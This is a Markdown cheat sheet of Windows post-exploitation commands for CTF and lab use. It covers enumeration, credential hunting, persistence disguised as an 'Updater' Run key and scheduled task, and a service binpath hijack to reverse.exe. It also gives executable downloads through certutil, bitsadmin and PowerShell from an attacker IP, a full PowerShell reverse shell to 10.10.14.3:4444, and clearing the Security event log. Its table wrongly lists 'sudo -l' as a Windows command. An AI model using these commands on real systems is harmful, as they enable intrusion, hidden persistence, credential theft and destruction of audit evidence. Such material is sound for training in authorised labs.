---
icon: windows
---

# Windows CMDs 4 Hackers

## **Windows Command Line for Operators — Post-Exploitation & Enumeration Arsenal (CTF/Lab Use Only)**

***

### I. 🧩 System Discovery & Recon

#### 🧠 Basic Info

```cmd
whoami
hostname
ver
systeminfo
wmic os get caption,version,buildnumber
```

#### ⚙️ User & Group Info

```cmd
net user
net user <username>
net localgroup
net localgroup administrators
whoami /groups
```

#### 💡 System Architecture

```cmd
echo %PROCESSOR_ARCHITECTURE%
wmic os get osarchitecture
```

#### 🧱 Network Overview

```cmd
ipconfig /all
arp -a
netstat -ano
route print
nslookup <domain>
tracert <target>
```

***

### II. 🧭 Privilege Escalation Enumeration

#### 🔒 Local Privileges

```cmd
whoami /priv
net localgroup administrators
net localgroup "Remote Desktop Users"
```

#### ⚙️ Service Enumeration

```cmd
sc query
sc queryex type= service state= all
tasklist /svc
wmic service get name,startname,startmode,state
```

#### 🧱 Scheduled Tasks

```cmd
schtasks /query /fo LIST /v
```

#### 🧠 Auto Runs & Startup

```cmd
wmic startup get caption,command
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```

***

### III. 🧩 File System & Hidden Data

#### 🔍 File Discovery

```cmd
dir /s /b C:\Users\*.txt
dir /s /b C:\*.kdbx
dir /a
attrib  # view hidden/system attributes
```

#### 🔑 Sensitive Files

```cmd
findstr /si password *.txt *.ini *.config
findstr /si "conn string" *.config
findstr /si "key" web.config
```

#### 🧠 Search for Flags (CTFs)

```cmd
dir /s /b C:\ | find "flag"
findstr /si "flag{" C:\Users\*.*
```

***

### IV. 🧩 Processes, Tasks & Services

```cmd
tasklist
tasklist /v
taskkill /pid <PID> /f
wmic process list brief
wmic process get name,processid,executablepath
```

**Check parent-child relations:**

```cmd
wmic process get parentprocessid,processid,executablepath
```

**Service manipulation:**

```cmd
sc stop <service>
sc config <service> binpath= "C:\Temp\reverse.exe"
sc start <service>
```

***

### V. ⚙️ Network & Remote Enumeration

```cmd
net view \\<target>
net view /domain
net use
net use \\target\C$ /user:Administrator
```

#### 🧠 SMB Shares

```cmd
net share
wmic share get name,path,status
```

#### 💡 Active Sessions

```cmd
query user
qwinsta
net session
```

***

### VI. 🧱 Local Enumeration — WMI & WMIC

#### 🧠 Hardware & Software

```cmd
wmic computersystem get name,domain,manufacturer,model
wmic product get name,version
```

#### ⚙️ Network

```cmd
wmic nicconfig get ipaddress,macaddress,servicename
```

#### 🔑 User Info

```cmd
wmic useraccount get name,sid,status
```

***

### VII. 🧠 Windows Registry Arsenal

```cmd
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SYSTEM\CurrentControlSet\Services
```

**Find stored credentials:**

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

**Export keys for analysis:**

```cmd
reg export HKLM\Software\key C:\Temp\key.reg
```

***

### VIII. 🧱 User Persistence & Scheduled Execution

#### 🧠 Startup Persistence

```cmd
copy shell.bat "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"
```

#### ⚙️ Registry Persistence

```cmd
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\Users\Public\update.ps1"
```

#### 💣 Scheduled Task

```cmd
schtasks /create /sc onlogon /tn "Updater" /tr "C:\Users\Public\update.bat"
```

***

### IX. 🧰 File Transfer Arsenal

#### 🔄 PowerShell

```cmd
powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.14.2/file.exe','C:\Temp\file.exe')"
```

#### 💡 Certutil

```cmd
certutil -urlcache -split -f http://10.10.14.2/file.exe file.exe
```

#### ⚙️ SMB / FTP / Bitsadmin

```cmd
copy \\10.10.14.2\share\file.exe C:\Temp\
bitsadmin /transfer job /download /priority high http://10.10.14.2/file.exe C:\Temp\file.exe
```

***

### X. 🧩 Privilege Escalation Vectors

#### 🔑 Service Misconfig

```cmd
sc qc <service>
icacls "C:\Program Files\Service"
```

#### 💥 Unquoted Service Paths

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\"
```

#### ⚙️ Weak Permissions

```cmd
icacls "C:\Program Files"
icacls "C:\Windows\Tasks"
```

#### 🧠 Token Impersonation (Lab Use)

```cmd
whoami /priv
# Look for SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege
```

***

### XI. 🧱 Credential Hunting (Legal Labs Only)

#### ⚙️ Common Loot Paths

```cmd
dir /s /b C:\Users\*\AppData\Roaming\Microsoft\Credentials\
dir /s /b C:\Users\*\AppData\Local\Microsoft\Vault\
dir /s /b C:\Users\*\AppData\Roaming\FileZilla\
```

#### 🔑 Cached Credentials

```cmd
cmdkey /list
```

#### 💡 RDP History

```cmd
reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"
```

***

### XII. 🧩 Defense Awareness

#### 🔥 Firewall Rules

```cmd
netsh advfirewall show allprofiles
netsh advfirewall firewall show rule name=all
```

#### 🧠 AV Detection

```cmd
sc query windefend
wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName,productState
```

#### ⚙️ Windows Event Logs

```cmd
wevtutil el | find "Security"
wevtutil qe Security /f:text /c:10
```

***

### XIII. 🧠 Reverse Shells (Lab / CTF Only)

```cmd
powershell -nop -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.3',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"
```

***

### XIV. 🧠 Post-Exploitation Clean-Up

```cmd
del /f /q C:\Temp\file.exe
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /f
schtasks /delete /tn Updater /f
wevtutil cl Security
```

***

### XV. ⚡ Operator Shortcuts Table

| Category             | Command                         | Description                |
| -------------------- | ------------------------------- | -------------------------- |
| User Info            | `net user`, `whoami /groups`    | Enumerate accounts         |
| Network              | `ipconfig /all`, `netstat -ano` | View adapters/ports        |
| Privilege Escalation | `whoami /priv`, `sudo -l`       | Identify privilege context |
| Services             | `sc qc`, `wmic service get ...` | Inspect misconfigurations  |
| Persistence          | `schtasks`, `reg add ...Run`    | Maintain presence          |
| Transfer             | `certutil`, `bitsadmin`         | File movement              |
| Clean-Up             | `wevtutil cl`, `del /f /q`      | Erase traces               |

***
